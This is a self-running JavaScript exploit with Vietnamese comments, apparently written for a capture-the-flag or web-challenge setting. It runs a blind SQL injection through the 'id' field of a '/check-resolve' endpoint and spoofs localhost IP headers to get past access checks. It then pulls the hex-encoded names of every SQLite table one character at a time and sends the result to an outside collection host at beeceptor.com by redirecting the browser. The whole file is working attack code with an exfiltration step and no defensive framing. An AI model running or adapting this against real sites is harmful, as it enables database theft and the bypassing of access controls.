(async function() {
    let startTime = Date.now(); // Bật đồng hồ bấm giờ

    async function ask(query) {
        let fd = new URLSearchParams();
        fd.append('id', `6 AND (${query})`);
        try {
            let r = await fetch('/check-resolve', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Forwarded-For': '127.0.0.1',
                    'X-Real-IP': '127.0.0.1',
                    'Client-IP': '127.0.0.1'
                },
                body: fd.toString()
            });
            let data = await r.text();
            return data.includes('Not yet');
        } catch(e) { return false; }
    }

    let hexData = "";
    let chars = "0123456789ABCDEF";
    
    // Quét mã Hex của tên tất cả các bảng trong DB
    for (let pos = 1; pos <= 80; pos++) {
        // CƠ CHẾ BẢO VỆ: Nếu chạy quá 4 giây -> Phanh gấp để kịp gửi kết quả!
        if (Date.now() - startTime > 4000) {
            break;
        }

        let found = false;
        for (let i = 0; i < chars.length; i++) {
            let c = chars[i];
            // Kỹ thuật Blind SQLi bằng Hex (Chống mọi lỗi syntax)
            let is_match = await ask(`substr(hex((SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')), ${pos}, 1) = '${c}'`);
            
            if (is_match) {
                hexData += c;
                found = true;
                break;
            }
        }
        if (!found) break; // Hết chuỗi thì dừng
    }
    
    // Bắn kết quả về căn cứ
    window.location = 'https://khanh.free.beeceptor.com/?table_hex=' + hexData;
})();